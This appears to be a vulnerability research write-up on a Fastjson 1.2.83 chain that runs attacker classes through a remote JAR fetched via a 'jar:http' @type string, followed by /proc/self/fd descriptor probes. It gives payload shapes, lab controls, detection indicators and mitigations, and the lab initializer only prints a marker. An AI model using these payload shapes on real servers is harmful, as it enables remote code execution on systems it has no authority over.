# Mechanism: Fastjson 1.2.83 remote-JAR/FD continuation

## Direct result

The marker-only lab reproduces this exact application call on a normal embedded
Tomcat request thread:

```java
final BoundEnvelope parsed = JSON.parseObject(body, BoundEnvelope.class);
```

The reproduced target is Fastjson 1.2.83, Spring Boot 3.2.0, Tomcat 10.1.16,
Temurin JDK 17 and Linux. AutoType remains disabled. `BoundEnvelope` has a
`List<Object>` field, which gives nested attacker-controlled objects a route to
`@type` processing. One body sets a fixed in-JVM marker and still returns the
normally bound `BoundEnvelope`. Boot 2.7.18/Tomcat 9 on the same JDK 17 also
reproduced in the research harness.

This demonstrates that DTO binding and JDK 9+ are not complete mitigations. It
does not mean every DTO shape or every Boot/JDK/OS combination is exploitable;
the reachable object carrier, loader, URL/JAR cache, OS descriptor namespace,
egress and parser configuration remain relevant.

## Load-bearing Fastjson behavior

`ParserConfig.checkAutoType` scans a class resource before its final disabled-
AutoType decision. In simplified form:

```java
String resource = typeName.replace('.', '/') + ".class";
InputStream is = loader.getResourceAsStream(resource);
if (is != null) {
    // ASM reads the class resource and checks for @JSONType
    jsonType = hasJsonType(is);
}

if (autoTypeSupport || jsonType || expectClassFlag) {
    clazz = TypeUtils.loadClass(typeName, defaultClassLoader, cacheClass);
}

// Fastjson 1.2.83 late failure-soft branch
if (typeName.endsWith("Exception") || typeName.endsWith("Error")) {
    return null;
}
throw new JSONException("autoType is not support. " + typeName);
```

The attacker-controlled resource expression was introduced in the 1.2.48 line.
The exact single-body continuation documented here relies on the late
`Exception`/`Error` suffix behavior in 1.2.83. Therefore:

- 1.2.83 is the exact end-to-end reproduced release;
- 1.2.48–1.2.82 contain the underlying probe and require separate version-
  specific continuation testing; and
- a broad “1.2.66–1.2.83 all behave identically” claim is not supported by this
  lab.

SafeMode and `Feature.IgnoreAutoType` are evaluated before this resource scan on
the ordinary handler-free path and both stopped the reproduced body. Installed
`AutoTypeCheckHandler`s must be audited separately because handler ordering can
change the effective path.

## One-body modern-JDK sequence

The body contains an ordered collection of objects.

### 1. Remote-JAR seed

The first type is shaped like:

```text
jar:http:..artifact:18081.x!.foo.Exception
```

Fastjson changes dots to slashes for the resource lookup. A Boot/JAR URL loader
therefore requests a resource from the lab artifact service. The first class is
only a carrier: it has superclass `Object`, no `@JSONType`, no static initializer
and no process-execution API. It does not need to extend `Exception`; the
attacker-controlled **string** ending is what reaches Fastjson 1.2.83's late
failure-soft branch.

The remote JAR is copied to a temporary `jar_cache*.tmp` file and remains open in
the JVM's JAR cache after the entry stream closes. The reproduced positive case
made two HTTP GETs and first retained that JAR at descriptor 15.

### 2. Descriptor candidates

Later elements try bounded candidates such as:

```text
jar:file:.proc.self.fd.15!.fd15.Exception
jar:file:.proc.self.fd.16!.fd16.Exception
```

After Fastjson's dot-to-slash conversion, a matching candidate opens a class
resource through the Java process's own `/proc/self/fd/N` symlink. The JAR
contains a candidate-specific class whose internal name matches that URL-shaped
type and whose bytecode has runtime-visible `@JSONType(asm=false)`.

The resource scan now sees `@JSONType`, `TypeUtils.loadClass` defines the class,
and its static initializer runs before final DTO conversion. The safe lab's
initializer can only set and print the fixed token:

```text
FASTJSON_MODERN_FD_MARKER=fastjson-modern-fd-marker-v1
```

It contains no `Runtime.exec`, `ProcessBuilder`, shell path or arbitrary command.

### 3. Normal binding can follow initialization

Fastjson continues through the `List<Object>` and returns a normal
`BoundEnvelope`. A successful HTTP response, or absence of a final cast error,
therefore does not disprove class initialization earlier in the parse lifecycle.

## Decisive controls

| Control | Remote GET | Marker | Interpretation |
|---|---:|---:|---|
| Ordinary DTO body, no `@type` | no | no | Baseline binding is inert. |
| FD candidates in a fresh JVM, no seed | no | no | An already open seeded JAR is required. |
| Seed plus deliberately impossible FDs | yes | no | Fetch alone is not the terminal. |
| Complete body with SafeMode | no | no | SafeMode blocks the ordinary path before lookup. |
| Complete body with `IgnoreAutoType` | no | no | Feature blocks the same path. |
| Seed, then explicit cached-JAR close, then matching FD | yes | no | Retained cached descriptor is causal. |
| Seed, requested GCs, then matching FD | yes | yes | GC alone did not release the cached descriptor. |
| Target cannot reach artifact service | no | no | HTTP egress is required. |
| Plain JDK `AppClassLoader`, no Boot loader | no | no | The reproduced loader capability is required. |

The self-contained `modern-fd/` scripts include the first four controls; the
larger research packet contains the extended matrix.

## Preconditions and boundaries

| Condition | Reproduced scope |
|---|---|
| Fastjson version | Exact single-body terminal: 1.2.83 |
| Data shape | Fixed DTO with reachable `List<Object>` carrier |
| AutoType | Disabled; not a mitigation |
| SafeMode | Disabled for positive; enabled control is negative |
| Loader | Boot 3.2 and Boot 2.7 executable-JAR loaders reproduced |
| Servlet path | Normal embedded Tomcat request thread |
| Runtime | Temurin JDK 17 on Linux |
| Descriptor namespace | `/proc/self/fd` |
| Network | HTTP access from target to artifact service |
| Terminal | Fixed marker only; no command execution in this lab |

Not established by this repository's current runtime evidence: JDK 21/25,
macOS `/dev/fd`, Windows, Jetty, Undertow, native image, arbitrary Boot patch
levels, or every possible DTO. The passive detector recognizes `/dev/fd` as a
high-value sibling indicator, but that is detection coverage rather than a local
macOS reproduction claim.

## Detection

Inspect the parsed JSON tree, not only raw request bytes. JSON Unicode escapes
can hide `@type` from literal matching. High-confidence indicators are:

1. a decoded remote `jar:http` or `jar:https` `@type` ending in `Exception` or
   `Error`;
2. followed in the same array by a dense series of decoded
   `jar:file:/proc/{self,thread-self,pid}/fd/N` or `/dev/fd/N` types, regardless
   of the class-entry name after `!`;
3. optionally, candidate resource number `N` matching a public-convention class
   name `fdN` (useful confidence evidence, not a protocol requirement); and
4. correlated outbound duplicate GETs, `jar_cache*.tmp`, retained descriptors,
   and reads through the process's FD namespace.

Run `scanner/fjdetect.py` for captured bodies/logs and `fjscan_static.py` for
artifact triage. `fjscan_probe.py`'s built-in canary serves only an empty HTTP
404; a callback from it proves resource lookup/egress, not class definition or
execution. Preserve duplicate
JSON keys in encounter order when implementing an equivalent gateway rule.

## Mitigation

- Migrate untrusted parsing away from Fastjson 1.x to a maintained, pinned and
  regression-tested parser.
- Enable `-Dfastjson.parser.safeMode=true` on the ordinary path and inventory any
  installed `AutoTypeCheckHandler`.
- Remove unnecessary JVM HTTP egress and enforce destination allowlists.
- Reject or alert on decoded remote-JAR and FD-chain `@type` values before they
  reach Fastjson.
- Do not rely on DTO binding, a normal response, or JDK 9+ as the sole control.

The original top-level JDK 8 lab demonstrates a different direct-class lane and
is intentionally kept separate from this modern FD reconstruction.
